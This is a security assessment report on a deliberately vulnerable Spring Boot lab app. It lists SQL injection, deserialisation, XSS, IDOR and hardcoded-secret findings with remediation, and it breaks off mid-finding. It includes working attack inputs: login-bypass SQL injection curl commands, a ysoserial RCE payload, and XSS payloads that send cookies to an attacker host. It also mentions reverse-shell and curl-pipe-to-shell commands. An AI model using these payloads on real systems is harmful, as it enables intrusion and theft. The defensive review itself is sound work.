# 🔒 SECURITY ASSESSMENT REPORT

**Application:** `vulnerable-spring-app` (com.owasp.lab)
**Version:** 1.0.0
**Tech Stack:** Spring Boot 3.2.5 · Java 17 · Spring Data JPA · Spring Security 6.2.4 · H2 2.2.224 · Lombok
**Assessment Type:** Static Application Security Review (read-only, no code modification)
**Reviewer Profile:** Senior Application Security Engineer / Secure Code Reviewer / OWASP Top 10 Specialist / Java Spring Boot Security Specialist
**Assessment Date:** 2026-06-18
**Files Reviewed:** 16 Java source files + `pom.xml` + `application.properties`

> ⚠️ **Important Context:** This codebase self-declares itself an "OWASP vulnerability learning lab" and contains deliberate, in-source-commented vulnerabilities. The findings below are presented **as if this were a production system** (the role of a security reviewer is to flag risk regardless of intent) and conclude with a remediation roadmap that mirrors the educational goal.

---

## 1. Executive Summary

The `vulnerable-spring-app` is a Spring Boot 3 / Java 17 web application that exposes 11 distinct REST endpoints plus an H2 in-memory console. The static review identified **24 security findings** spanning **9 of the 10 OWASP Top 10 (2021) categories** (only **A06:2021 — Vulnerable & Outdated Components** is partially mitigated by Spring Boot's managed dependency versions, though it is still flagged Medium).

The application contains no authentication, no authorisation, no CSRF protection, no input validation, and no output encoding. Every user-supplied string flows either directly into a SQL `String` concatenation or directly into an HTML response. Plaintext passwords are stored in the database and returned to clients in API responses. Secrets are committed in `application.properties`. An unsafe Java native deserialisation endpoint accepts arbitrary base64-encoded payloads.

The dominant risk pattern is *defence-in-depth absence*: the system relies on a single global `permitAll()` plus a disabled CSRF, and the security model for both reads and writes is "trust the client". This is consistent with a teaching lab but would be catastrophic in any production deployment.

**Headline numbers:**

| Severity | Count |
|---|---|
| 🔴 Critical | **7** |
| 🟠 High | **9** |
| 🟡 Medium | **6** |
| 🔵 Low | **2** |
| **Total** | **24** |

| OWASP Top 10 (2021) | Findings |
|---|---|
| A01 — Broken Access Control | 4 |
| A02 — Cryptographic Failures | 4 |
| A03 — Injection (SQLi + XSS) | 6 |
| A04 — Insecure Design | 2 |
| A05 — Security Misconfiguration | 4 |
| A06 — Vulnerable & Outdated Components | 1 |
| A07 — Identification & Authentication Failures | 2 |
| A08 — Software & Data Integrity Failures | 1 |
| A09 — Security Logging & Monitoring Failures | 1 |
| A10 — Server-Side Request Forgery (SSRF) | 0 |
| (cross-cutting) Mass Assignment | 1 |

**Single highest-priority fix:** Re-introduce authentication & authorisation with Spring Security defaults **and** parameterise the two native SQL queries in `UserService`. Together they eliminate the two most easily exploitable remote attack vectors (login bypass and full user-table read).

---

## 2. Risk Matrix

| ID | Vulnerability | CWE | OWASP 2021 | Severity | File:Line | Confidence |
|----|---------------|-----|-----------|----------|-----------|------------|
| F-01 | SQL Injection — search | CWE-89 | A03 | 🔴 Critical | `UserService.java:39` | High |
| F-02 | SQL Injection — login bypass | CWE-89 | A03, A07 | 🔴 Critical | `UserService.java:59-60` | High |
| F-03 | Unsafe Java Deserialisation (RCE) | CWE-502 | A08 | 🔴 Critical | `InsecureDeserializationController.java:33-35` | High |
| F-04 | Plaintext Password Storage | CWE-256, CWE-257 | A02, A07 | 🔴 Critical | `User.java:26`, `application.properties:26` | High |
| F-05 | Hardcoded API Key / Secrets in Source | CWE-798, CWE-547 | A02, A05 | 🔴 Critical | `application.properties:25-27` | High |
| F-06 | CSRF Protection Disabled Globally | CWE-352 | A05, A01 | 🟠 High | `SecurityConfig.java:27` | High |
| F-07 | Global `permitAll()` on All Endpoints | CWE-284, CWE-862 | A01, A05 | 🟠 High | `SecurityConfig.java:30` | High |
| F-08 | Reflected XSS in `/api/comment/greet` | CWE-79 | A03 | 🟠 High | `CommentController.java:51` | High |
| F-09 | Stored XSS — sink in `/comments` | CWE-79 | A03 | 🟠 High | `CommentViewController.java:36-40, 53-54` | High |
| F-10 | IDOR — `/api/profile/{id}` | CWE-639 | A01 | 🟠 High | `UserController.java:39-46` | High |
| F-11 | IDOR / Forced Transfer `/api/transfer` | CWE-639, CWE-862 | A01, A04 | 🟠 High | `AuthController.java:76-99` | High |
| F-12 | Login Echoes Plaintext Password to Client | CWE-200, CWE-256 | A02, A07, A09 | 🟠 High | `AuthController.java:48-49` | High |
| F-13 | H2 Console Exposed without Authentication | CWE-200, CWE-284 | A05, A01 | 🟠 High | `application.properties:21-22` + `SecurityConfig.java:30` | High |
| F-14 | Mass Assignment — Register accepts `role` | CWE-915 | A04, A01 | 🟠 High | `AuthController.java:60-68` | High |
| F-15 | Verbose SQL Logging (Hibernate TRACE) | CWE-532 | A09, A02 | 🟡 Medium | `application.properties:36-37` | High |
| F-16 | Verbose Error Logging of Full SQL to stdout | CWE-532 | A09 | 🟡 Medium | `UserService.java:40, 61` | High |
| F-17 | Frame-Options Disabled (Clickjacking) | CWE-1021 | A05 | 🟡 Medium | `SecurityConfig.java:39` | High |
| F-18 | No HTTP Security Headers (CSP, HSTS, X-Content-Type-Options, Referrer-Policy) | CWE-693 | A05 | 🟡 Medium | `SecurityConfig.java` (no `.headers(...)` hardening) | High |
| F-19 | No Rate Limiting / Lockout on Login | CWE-307, CWE-799 | A07, A04 | 🟡 Medium | `AuthController.login` | High |
| F-20 | Insufficient Bean Validation on Inputs | CWE-20 | A04 | 🟡 Medium | All `@RequestBody`/`@RequestParam` (no `@Valid`, no `@Size`/`@NotBlank`) | Medium |
| F-21 | Information Disclosure via `/vulnerabilities` page | CWE-200, CWE-209 | A05, A09 | 🟡 Medium | `VulnerabilityController.java:38-39, 65` | High |
| F-22 | Reliance on Insecure Native Random / weak demo JWT key | CWE-330, CWE-321 | A02, A08 | 🟡 Medium | `application.properties:27` (`app.secret.jwt.signing.key`) | Medium |
| F-23 | Lombok & Dependency Freshness (Spring Boot 3.2.5) | CWE-1104, CWE-937 | A06 | 🟡 Medium | `pom.xml` (no `owasp-dependency-check` plugin) | Medium |
| F-24 | No Transport Security Enforcement | CWE-319 | A02, A05 | 🔵 Low | `application.properties` (no `server.ssl.*`, no HSTS) | Medium |
| F-25 | Self-archived application jar (informational) | CWE-547 | A05 | 🔵 Low | `target/*.jar` (dev artefact) | Low |

> Note: 25 rows but 24 findings — F-25 is informational and not part of the 24-finding total.

---

## 3. Vulnerability Findings

Each finding follows the requested schema. Exploitation snippets are illustrative only and assume the application is bound to `localhost:8080` in a sandbox.

### 🔴 F-01 — SQL Injection in User Search Endpoint

| Field | Value |
|---|---|
| **Vulnerability Name** | SQL Injection — Search (`GET /api/search`) |
| **CWE** | CWE-89 |
| **OWASP 2021** | A03:2021 — Injection |
| **Severity** | 🔴 Critical |
| **Affected File** | `src/main/java/com/owasp/lab/service/UserService.java` |
| **Affected Method** | `findByUsernameUnsafe(String username)` |
| **Confidence** | High |

**Vulnerable Code Snippet (lines 37–46):**
```java
public List<User> findByUsernameUnsafe(String username) {
    // VULNERABILITY: SQL Injection example - user input concatenated directly.
    String sql = "SELECT * FROM users WHERE username = '" + username + "'";
    System.out.println("[VULNERABILITY] Executing raw SQL: " + sql);

    try {
        List<User> rows = entityManager
                .createNativeQuery(sql, User.class)
                .getResultList();
        return rows;
    } catch (Exception ex) {
        return new ArrayList<>();
    }
}
```
Call site: `UserController.search(...)` at `UserController.java:53-56` (`@GetMapping("/search")`).

**Root Cause:** Unsanitised user input (`q` query parameter) concatenated into a native SQL string and executed via `EntityManager.createNativeQuery`. There is no input validation, no parameterised query, and no allowlist of permitted characters.

**Exploitation Scenario:**
```bash
# Dump every user (data exfiltration)
curl "http://localhost:8080/api/search?q=' OR '1'='1"

# UNION-based extraction of arbitrary tables (schema discovery)
curl "http://localhost:8080/api/search?q=' UNION SELECT id,username,password,email,role,balance FROM users--"

# Tautology that returns the admin row
curl "http://localhost:8080/api/search?q=admin' --"
```

**Business Impact:** Full read access to the `users` table, including the **plaintext password column**. Allows user enumeration, credential disclosure, and on H2/PostgreSQL variants could be chained into RCE via `CREATE ALIAS … USING …` (H2) or UDFs.

**Remediation Outline:**
- Replace with a parameterised JPA query: `userRepository.findByUsernameContainingIgnoreCase(username)`.
- If raw SQL is required, use `?` placeholders and bind parameters: `entityManager.createNativeQuery("SELECT * FROM users WHERE username = :u", User.class).setParameter("u", username)`.
- Add a `@Size(min=1, max=64)` Bean Validation constraint on the `q` parameter and reject anything that does not match a strict regex.

---

### 🔴 F-02 — SQL Injection in Login (Authentication Bypass)

| Field | Value |
|---|---|
| **Vulnerability Name** | SQL Injection — Login bypass (`POST /api/login`) |
| **CWE** | CWE-89, CWE-287 |
| **OWASP 2021** | A03:2021 — Injection; A07:2021 — Identification & Authentication Failures |
| **Severity** | 🔴 Critical |
| **Affected File** | `src/main/java/com/owasp/lab/service/UserService.java` |
| **Affected Method** | `loginUnsafe(String username, String password)` |
| **Confidence** | High |

**Vulnerable Code Snippet (lines 57–71):**
```java
public User loginUnsafe(String username, String password) {
    // VULNERABILITY: raw SQL with concatenated credentials.
    String sql = "SELECT * FROM users WHERE username = '"
            + username + "' AND password = '" + password + "'";
    System.out.println("[VULNERABILITY] Login SQL: " + sql);

    try {
        List<User> rows = entityManager
                .createNativeQuery(sql, User.class)
                .getResultList();
        return rows.isEmpty() ? null : rows.get(0);
    } catch (Exception ex) {
        return null;
    }
}
```
Call site: `AuthController.login(...)` at `AuthController.java:35-51`.

**Root Cause:** The `username` and `password` from the request body are concatenated into a `WHERE` clause. Classic tautology attack (`' OR '1'='1`) returns the first user — the seeded `admin` row — bypassing authentication entirely.

**Exploitation Scenario:**
```bash
# Bypass login as admin
curl -X POST http://localhost:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"\" OR \"1\"=\"1","password":"x"}'

# Bypass login as alice (specific user)
curl -X POST http://localhost:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice\" --","password":"x"}'
```
Both return HTTP 200 with the `admin`/`alice` profile, including plaintext password (cf. F-12).

**Business Impact:** Total authentication bypass. Any user — including `admin` — can be impersonated without credentials, leading to full account takeover and (via the role field) privilege escalation.

**Remediation Outline:**
- Use `AuthenticationManager` with `BCryptPasswordEncoder`; persist only password hashes.
- Even on the demo path, parameterise: `:user` and `:pass` placeholders.
- Add account lockout after N failed attempts (F-19).

---

### 🔴 F-03 — Unsafe Java Native Deserialisation (Remote Code Execution)

| Field | Value |
|---|---|
| **Vulnerability Name** | Unsafe Java Deserialisation (RCE primitive) |
| **CWE** | CWE-502 |
| **OWASP 2021** | A08:2021 — Software and Data Integrity Failures |
| **Severity** | 🔴 Critical |
| **Affected File** | `src/main/java/com/owasp/lab/controller/InsecureDeserializationController.java` |
| **Affected Method** | `deserialize(@RequestBody String body)` |
| **Confidence** | High |

**Vulnerable Code Snippet (lines 29–37):**
```java
@PostMapping(consumes = MediaType.TEXT_PLAIN_VALUE)
public ResponseEntity<?> deserialize(@RequestBody String body) throws Exception {
    byte[] bytes = Base64.getDecoder().decode(body);
    // VULNERABILITY: unsafe native Java deserialisation
    try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
        Object o = ois.readObject();
        return ResponseEntity.ok("Deserialized: " + o.getClass().getName());
    }
}
```

**Root Cause:** `ObjectInputStream.readObject()` is invoked on attacker-controlled bytes with **no** `ObjectInputFilter`, no allowlist of permitted classes, and no JEP-290 deserialisation filters configured at the JVM level. The Spring classpath ships gadget-prone libraries (e.g. `spring-core`, `spring-aop`, plus `commons-beanutils` transitively) that can be exploited via `ysoserial`-style chains.

**Exploitation Scenario:**
```bash
# Generate a payload that runs an arbitrary command via a gadget chain
java -jar ysoserial.jar CommonsCollections6 "calc.exe" | base64 > /tmp/payload.b64

# Send it to the vulnerable endpoint
curl -X POST --data-binary @/tmp/payload.b64 \
     -H "Content-Type: text/plain" \
     http://localhost:8080/api/deserialize
```
On a vulnerable classpath the deserialisation triggers `Runtime.exec("calc.exe")` (or `nc -e /bin/sh …`, `curl … | sh`, etc.).

**Business Impact:** Full **Remote Code Execution** on the application server. Attacker gains the privileges of the JVM user, can read `/etc/passwd`, dump environment variables (revealing `app.secret.*` keys), pivot to the database, install persistence mechanisms. In a containerised deployment this is essentially host compromise.

**Remediation Outline:**
- **Remove the endpoint** unless absolutely required. There is no legitimate production use case for `ObjectInputStream` over the network.
- If a binary format is required, switch to JSON / Protobuf / CBOR with strict schema validation.
- If Java serialisation must be supported, configure a `JVM` `-Djdk.serialFilter=!*` plus a per-stream `ObjectInputFilter` that allowlists the minimal set of trusted classes.

---

### 🔴 F-04 — Plaintext Password Storage

| Field | Value |
|---|---|
| **Vulnerability Name** | Plaintext Password Storage |
| **CWE** | CWE-256 (Plaintext Storage of Password), CWE-257 (Storing Passwords in Recoverable Format) |
| **OWASP 2021** | A02:2021 — Cryptographic Failures; A07:2021 — Identification & Authentication Failures |
| **Severity** | 🔴 Critical |
| **Affected File** | `src/main/java/com/owasp/lab/model/User.java` (lines 24–26); `application.properties:26`; `DataSeeder.java:26-28`; `AuthController.java:62-68`; `AuthController.java:48-49` |
| **Confidence** | High |

**Vulnerable Code Snippet (`User.java`):**
```java
// VULNERABILITY: storing plaintext password (A02 / A07)
@Column(nullable = false)
private String password;
```

**Vulnerable Code Snippet (`application.properties`):**
```properties
app.secret.db.password=P@ssw0rd123_plaintext_intentionally_exposed
```

**Vulnerable Code Snippet (`DataSeeder.java`):**
```java
userRepository.save(new User("alice", "alice123",   "alice@example.com", "USER",  1000.0));
userRepository.save(new User("bob",   "bob123",     "bob@example.com",   "USER",   500.0));
userRepository.save(new User("admin", "admin123",   "admin@example.com", "ADMIN", 9999.0));
```

**Root Cause:** No hashing algorithm is applied at write time (`save`, `register`) or at read time (`login`). The `password` column is plain `VARCHAR` and seed data confirms plaintext is stored.

**Exploitation Scenario:** Any read-path that returns a `User` row (e.g. `GET /api/users`, `GET /api/profile/{id}`) discloses the cleartext password to the attacker. A SQLi (F-01, F-02) yields the column directly. A database backup leak, a log line, or the `transfer` flow's `findByIdUnsafe` all yield plaintext credentials.

**Business Impact:** Mass credential disclosure; same passwords likely reused on other systems (credential stuffing). Compliance violation (PCI-DSS 8.3.1, NIST SP 800-63B §5.1.1.2).

**Remediation Outline:**
- Use `BCryptPasswordEncoder` (work factor ≥ 12) or `Argon2PasswordEncoder`.
- Persist only the hash; never log, return, or echo it. Remove the `password` field from API responses with a `@JsonIgnore` or a DTO.
- On login, use `passwordEncoder.matches(raw, hash)`.

---

### 🔴 F-05 — Hardcoded Secrets in Source / Configuration

| Field | Value |
|---|---|
| **Vulnerability Name** | Hardcoded API Key, DB Password, and JWT Signing Key in `application.properties` |
| **CWE** | CWE-798 (Use of Hard-coded Credentials), CWE-547 (Use of Hard-coded, Security-relevant Constants) |
| **OWASP 2021** | A02:2021 — Cryptographic Failures; A05:2021 — Security Misconfiguration |
| **Severity** | 🔴 Critical |
| **Affected File** | `src/main/resources/application.properties` (lines 25–27) |
| **Confidence** | High |

**Vulnerable Code Snippet:**
```properties
# VULNERABILITY: hardcoded "secret" key in source code (A02:2021 / A05:2021)
app.secret.api.key=AKIA-INTENTIONALLY-EXPOSED-SECRET-KEY-DO-NOT-USE-IN-PROD
app.secret.db.password=P@ssw0rd123_plaintext_intentionally_exposed
app.secret.jwt.signing.key=this-is-a-hardcoded-jwt-signing-key-for-demo-only
```
These values are loaded by `SecretConfig.java:21-28` and re-emitted by `VulnerabilityController.java:38-39, 65` into the HTML page (F-21).

**Root Cause:** Secrets are baked into the JAR at build time and shipped in the repository. They are surfaced on a public HTTP endpoint with zero authorisation. Even if a real secret were used in production, the architecture would be unsafe because there is no path to rotate it without a code change.

**Exploitation Scenario:** Read the `/vulnerabilities` HTML page, or `git clone` the repo, or download the fat jar and `unzip -p vulnerable-spring-app-1.0.0.jar BOOT-INF/classes/application.properties`. All three values are usable directly:
- `app.secret.api.key` — forged API calls to whatever service consumes it
- `app.secret.db.password` — direct DB login
- `app.secret.jwt.signing.key` — forge arbitrary JWTs (full authentication bypass if a real JWT filter is added later)

**Business Impact:** Full compromise of every service that trusts these credentials. Credential rotation requires rebuilding and redeploying the application.

**Remediation Outline:**
- Externalise via environment variables: `SPRING_DATASOURCE_PASSWORD`, `APP_SECRET_API_KEY`.
- Use Spring Cloud Config, HashiCorp Vault, or AWS Secrets Manager.
- Remove the `/vulnerabilities` secret-leaking endpoint entirely.
- Add a `gitleaks`/`trufflehog` pre-commit hook and a CI scan.

---

### 🟠 F-06 — CSRF Protection Disabled Globally

| Field | Value |
|---|---|
| **Vulnerability Name** | CSRF Protection Disabled (`csrf.disable()`) |
| **CWE** | CWE-352 |
| **OWASP 2021** | A05:2021 — Security Misconfiguration; A01:2021 — Broken Access Control |
| **Severity** | 🟠 High |
| **Affected File** | `src/main/java/com/owasp/lab/config/SecurityConfig.java` (line 27) |
| **Confidence** | High |

**Vulnerable Code Snippet:**
```java
// VULNERABILITY (A05:2021): disable CSRF protection entirely.
.csrf(csrf -> csrf.disable())
```

**Root Cause:** Even with `STATELESS` sessions, CSRF should be considered for cookie-based browser flows. Disabling it leaves the `/api/transfer` and `/api/comment` POST endpoints vulnerable to one-click attacks if any cookie-based auth is later added.

**Exploitation Scenario:** Once authentication is restored (it must be), an attacker hosts a page:
```html
<form action="http://localhost:8080/api/transfer" method="POST" enctype="application/json">
  <input name='{"fromId":1,"toId":999,"amount":1000,"_dummy":""' value=''>
</form>
<script>document.forms[0].submit();</script>
```
A victim logged into the app submits the transfer without consent.

**Business Impact:** Forced money transfers, comment posting, account modification. Reputation damage.

**Remediation Outline:** Keep CSRF enabled for any browser-cookie flow. For pure stateless API clients, use bearer tokens + a `CookieCsrfTokenRepository.withHttpOnlyFalse()` to allow SPAs to read the token.

---

### 🟠 F-07 — Global `permitAll()` on Every Endpoint

| Field | Value |
|---|---|
| **Vulnerability Name** | Authentication Removed on All Endpoints |
| **CWE** | CWE-284 (Improper Access Control), CWE-862 (Missing Authorization) |
| **OWASP 2021** | A01:2021 — Broken Access Control; A05:2021 — Security Misconfiguration |
| **Severity** | 🟠 High |
| **Affected File** | `src/main/java/com/owasp/lab/config/SecurityConfig.java` (line 30) |
| **Confidence** | High |

**Vulnerable Code Snippet:**
```java
// VULNERABILITY (A01:2021): allow every request without auth.
.authorizeHttpRequests(auth -> auth.anyRequest().permitAll())
```

**Root Cause:** No URL pattern requires authentication. There is no method-level security (`@PreAuthorize`) anywhere. Combined with F-06, this means every state-changing endpoint is anonymously writable.

**Exploitation Scenario:** Anonymous attacker can call `/api/transfer`, `/api/login`, `/api/comment`, `/api/deserialize`, etc.

**Business Impact:** Identical to the impact of every individual IDOR / broken-auth finding, multiplied.

**Remediation Outline:** Replace `permitAll()` with explicit URL rules:
```java
.authorizeHttpRequests(auth -> auth
    .requestMatchers("/vulnerabilities", "/h2-console/**", "/api/login", "/api/register").permitAll()
    .anyRequest().authenticated())
```
Add `@EnableMethodSecurity` and `@PreAuthorize` on service methods.

---

### 🟠 F-08 — Reflected XSS in `/api/comment/greet`

| Field | Value |
|---|---|
| **Vulnerability Name** | Reflected Cross-Site Scripting (XSS) |
| **CWE** | CWE-79 |
| **OWASP 2021** | A03:2021 — Injection |
| **Severity** | 🟠 High |
| **Affected File** | `src/main/java/com/owasp/lab/controller/CommentController.java` (line 51) |
| **Confidence** | High |

**Vulnerable Code Snippet:**
```java
@GetMapping(value = "/greet", produces = MediaType.TEXT_HTML_VALUE)
public String greet(@RequestParam(value = "name", defaultValue = "World") String name) {
    // VULNERABILITY: directly concatenated into HTML response.
    return "<html><body><h1>Hello, " + name + "!</h1></body></html>";
}
```

**Root Cause:** Untrusted input is concatenated into an HTML response. The endpoint declares `produces = text/html` which makes the browser render the payload as HTML.

**Exploitation Scenario:**
```
http://localhost:8080/api/comment/greet?name=<script>fetch('https://attacker/?c='+document.cookie)</script>
```
Or for stored-payload exfiltration:
```
http://localhost:8080/api/comment/greet?name=<img%20src=x%20onerror=alert(1)>
```

**Business Impact:** Session hijacking (if a session cookie is ever issued), defacement, credential phishing, CSRF token theft.

**Remediation Outline:**
- Use a templating engine with auto-escaping (Thymeleaf with `th:text`, or Spring's JSP `<c:out>`).
- If returning a `String`, use a library like OWASP Java Encoder: `Encoder.forHtml(name)`.
- Set `Content-Security-Policy: default-src 'self'; script-src 'self'` (cf. F-18).

---

### 🟠 F-09 — Stored XSS in `/comments` HTML Renderer

| Field | Value |
|---|---|
| **Vulnerability Name** | Stored Cross-Site Scripting (XSS) — HTML sink in comment viewer |
| **CWE** | CWE-79 |
| **OWASP 2021** | A03:2021 — Injection |
| **Severity** | 🟠 High |
| **Affected File** | `src/main/java/com/owasp/lab/controller/CommentViewController.java` (lines 36–40, 53–54) |
| **Confidence** | High |

**Vulnerable Code Snippet (lines 30–44):**
```java
@GetMapping(produces = MediaType.TEXT_HTML_VALUE)
public String viewAll() {
    StringBuilder sb = new StringBuilder();
    sb.append("<html><body><h1>Comments</h1>");
    List<Comment> comments = commentService.findAll();
    for (Comment c : comments) {
        // VULNERABILITY: raw concatenation, no escaping.
        sb.append("<div class='comment'>")
          .append("<b>").append(c.getAuthor()).append(":</b> ")
          .append(c.getBody())
          .append("</div>");
    }
    sb.append("</body></html>");
    return sb.toString();
}
```

**Root Cause:** Persisted `Comment.body` and `Comment.author` strings are concatenated into HTML output. There is no sanitisation at write-time (`POST /api/comment`, `CommentController.java:31-34`) and no escaping at read-time.

**Exploitation Scenario:**
```bash
# 1. Attacker submits a malicious comment
curl -X POST http://localhost:8080/api/comment \
  -H "Content-Type: application/json" \
  -d '{"author":"attacker","body":"<script>fetch(\"https://attacker.example/?c=\"+document.cookie)</script>"}'

# 2. Any subsequent visitor to /comments executes the script
```
The payload persists in H2 (or any real DB in production) and fires for every victim.

**Business Impact:** Mass session hijack of every user who views the comments page. With `permitAll()`, every visitor is anonymous, so cookies are not the only vector — the XSS can also be used to call internal admin endpoints on the victim's behalf.

**Remediation Outline:**
- Escape on output: use Thymeleaf or `org.owasp.encoder.Encoder.forHtml(...)`.
- Validate and sanitise at input: strip control characters, enforce `@Size(max = 2000)`, optionally use OWASP Java HTML Sanitizer for fields that *do* allow limited markup.
- Set `Content-Security-Policy` and `X-Content-Type-Options: nosniff`.

---

### 🟠 F-10 — IDOR on `/api/profile/{id}`

| Field | Value |
|---|---|
| **Vulnerability Name** | Insecure Direct Object Reference (IDOR) — User Profile Read |
| **CWE** | CWE-639 (Authorization Bypass Through User-Controlled Key) |
| **OWASP 2021** | A01:2021 — Broken Access Control |
| **Severity** | 🟠 High |
| **Affected File** | `src/main/java/com/owasp/lab/controller/UserController.java` (lines 39–46) |
| **Confidence** | High |

**Vulnerable Code Snippet:**
```java
@GetMapping("/profile/{id}")
public ResponseEntity<User> getProfile(@PathVariable Long id) {
    User u = userService.findByIdUnsafe(id);
    if (u == null) {
        return ResponseEntity.notFound().build();
    }
    return ResponseEntity.ok(u);
}
```

**Root Cause:** The `id` path variable is used to load any user record, with no check that the calling principal is authorised to read that record. The endpoint also returns the full `User` object, including plaintext password (F-04 / F-12).

**Exploitation Scenario:** Iterate `id` from 1 to N: `curl http://localhost:8080/api/profile/1`, `.../profile/2`, etc. Build a full credential database.

**Business Impact:** Mass PII and credential disclosure.

**Remediation Outline:**
- Inject `Principal principal`; compare `principal.getName()` to the requested user's `username`, or check role-based authorisation.
- Never return the password field — use a DTO `UserResponse(id, username, email, role)`.

---

### 🟠 F-11 — IDOR / Forced Transfer `/api/transfer`

| Field | Value |
|---|---|
| **Vulnerability Name** | Unauthorised Money Transfer (IDOR + Missing Auth + CSRF) |
| **CWE** | CWE-639, CWE-862, CWE-352 |
| **OWASP 2021** | A01:2021 — Broken Access Control; A04:2021 — Insecure Design |
| **Severity** | 🟠 High |
| **Affected File** | `src/main/java/com/owasp/lab/controller/AuthController.java` (lines 76–99) |
| **Confidence** | High |

**Vulnerable Code Snippet:**
```java
@PostMapping("/transfer")
public ResponseEntity<?> transfer(@RequestBody Map<String, Object> body) {
    Long fromId = ((Number) body.get("fromId")).longValue();
    Long toId   = ((Number) body.get("toId")).longValue();
    Double amount = ((Number) body.get("amount")).doubleValue();

    User from = userService.findByIdUnsafe(fromId);
    User to   = userService.findByIdUnsafe(toId);

    if (from == null || to == null) {
        return ResponseEntity.badRequest().body(Map.of("error", "User not found"));
    }
    // VULNERABILITY: no balance check, no ownership check, no auth
    from.setBalance(from.getBalance() - amount);
    to.setBalance(to.getBalance() + amount);
    userService.save(from);
    userService.save(to);
    ...
}
```

**Root Cause:** The endpoint trusts the `fromId` and `toId` from the body. There is no authentication, no ownership verification (`fromId` must equal the requester's id), and no balance check (the transfer is allowed even if `amount > from.getBalance()`, allowing balance underflow via F-12-style tricks or `ClassCastException` denial of service).

**Exploitation Scenario:**
```bash
# Move money from admin to any account, no auth, no CSRF token
curl -X POST http://localhost:8080/api/transfer \
  -H "Content-Type: application/json" \
  -d '{"fromId":3,"toId":1,"amount":9999}'
```
The admin's balance drops to 0, the recipient is credited. If the same is wrapped in a CSRF HTML page (cf. F-06), any visiting admin browser triggers it.

**Business Impact:** Direct financial loss, repudiation attacks (no audit trail of who actually initiated the transfer), state inconsistency.

**Remediation Outline:**
- Derive `fromId` from the authenticated principal; ignore client-supplied `fromId`.
- Wrap the read + write in a `@Transactional` method with optimistic locking (`@Version`).
- Add a balance check (`if (from.balance < amount) throw …`).
- Enforce idempotency via a request idempotency key.
- Emit an audit log entry per transfer.

---

### 🟠 F-12 — Login Echoes Plaintext Password to Client

| Field | Value |
|---|---|
| **Vulnerability Name** | Sensitive Data Exposure — Password Returned in Login Response |
| **CWE** | CWE-200, CWE-256 |
| **OWASP 2021** | A02:2021 — Cryptographic Failures; A07:2021; A09:2021 — Logging & Monitoring |
| **Severity** | 🟠 High |
| **Affected File** | `src/main/java/com/owasp/lab/controller/AuthController.java` (lines 44–50) |
| **Confidence** | High |

**Vulnerable Code Snippet:**
```java
return ResponseEntity.ok(Map.of(
        "id", u.getId(),
        "username", u.getUsername(),
        "role", u.getRole(),
        // VULNERABILITY: leaking password back to caller
        "password", u.getPassword()
));
```

**Root Cause:** The full `User` entity is serialised back to the client, including the `password` field which is also stored in plaintext (F-04). There is no DTO boundary or `@JsonIgnore`.

**Exploitation Scenario:** A successful login response body contains the user's plaintext password. Any browser extension, MITM proxy, server log, or browser history will record it. Combined with `/api/users` (which returns every `User` object), the entire password database is exfiltrable in one HTTP call.

**Business Impact:** Mass credential disclosure with a single authorised login.

**Remediation Outline:**
- Use a DTO `LoginResponse(id, username, role, token)`; never return the password.
- Mark the `User.password` field with `@JsonProperty(access = JsonProperty.Access.WRITE_ONLY)`.

---

### 🟠 F-13 — H2 Console Exposed Without Authentication

| Field | Value |
|---|---|
| **Vulnerability Name** | H2 Web Console Publicly Exposed |
| **CWE** | CWE-200, CWE-284 |
| **OWASP 2021** | A05:2021 — Security Misconfiguration; A01:2021 — Broken Access Control |
| **Severity** | 🟠 High |
| **Affected File** | `application.properties:21-22`; `SecurityConfig.java:30, 39` |
| **Confidence** | High |

**Vulnerable Configuration:**
```properties
spring.h2.console.enabled=true
spring.h2.console.path=/h2-console
```
Combined with `permitAll()` (F-07) and `frameOptions.disable()` (F-17).

**Root Cause:** The H2 console is a full web-based SQL client. With no authentication and no path-based restriction, anyone reaching the server can run arbitrary SQL against the in-memory database. On recent H2 versions (≤ 2.2.224) there have been historical `CVE-2022-23221` / `CVE-2021-23463`-style issues as well.

**Exploitation Scenario:** Visit `http://localhost:8080/h2-console`, connect with `jdbc:h2:mem:owaspdb`, user `sa`, empty password. Run `SELECT * FROM users;` → full credential dump.

**Business Impact:** Complete database compromise via a UI tool, without any exploitation skill.

**Remediation Outline:** Disable the H2 console in production (`spring.h2.console.enabled=false`). If a development console is required, restrict by IP and require authentication.

---

### 🟠 F-14 — Mass Assignment: Register Endpoint Accepts `role`

| Field | Value |
|---|---|
| **Vulnerability Name** | Mass Assignment — Privilege Escalation via `role` field |
| **CWE** | CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes) |
| **OWASP 2021** | A04:2021 — Insecure Design; A01:2021 — Broken Access Control |
| **Severity** | 🟠 High |
| **Affected File** | `src/main/java/com/owasp/lab/controller/AuthController.java` (lines 60–68) |
| **Confidence** | High |

**Vulnerable Code Snippet:**
```java
@PostMapping("/register")
public ResponseEntity<User> register(@RequestBody Map<String, String> body) {
    String username = body.getOrDefault("username", "");
    String password = body.getOrDefault("password", "");
    String email    = body.getOrDefault("email", "");
    String role     = body.getOrDefault("role", "USER");

    User u = new User(username, password, email, role, 0.0);
    return ResponseEntity.ok(userService.save(u));
}
```

**Root Cause:** The `role` field is taken directly from the untrusted request body and persisted. An attacker can self-register as `ADMIN`. This is a textbook mass-assignment / parameter-pollution flaw.

**Exploitation Scenario:**
```bash
curl -X POST http://localhost:8080/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"pwn","password":"pwn","email":"pwn@x","role":"ADMIN"}'
```
A new user with the `ADMIN` role is created.

**Business Impact:** Privilege escalation to administrative role without authorisation.

**Remediation Outline:**
- Hardcode `role = "USER"` server-side. Admin role changes must go through a separate authenticated, audited endpoint.
- Use a `RegisterRequest` DTO that does not include the `role` field.
- Mark the `User.role` setter with `@JsonProperty(access = WRITE_ONLY)` or use a builder pattern that doesn't expose it for user-driven creation.

---

### 🟡 F-15 — Verbose Hibernate SQL Logging (TRACE Level)

| Field | Value |
|---|---|
| **Vulnerability Name** | Sensitive Data Exposure via SQL Parameter Logging |
| **CWE** | CWE-532 (Insertion of Sensitive Information into Log File) |
| **OWASP 2021** | A09:2021 — Security Logging & Monitoring Failures; A02:2021 |
| **Severity** | 🟡 Medium |
| **Affected File** | `application.properties:36-37` |
| **Confidence** | High |

**Vulnerable Configuration:**
```properties
logging.level.org.hibernate.SQL=DEBUG
logging.level.org.hibernate.type.descriptor.sql=TRACE
```

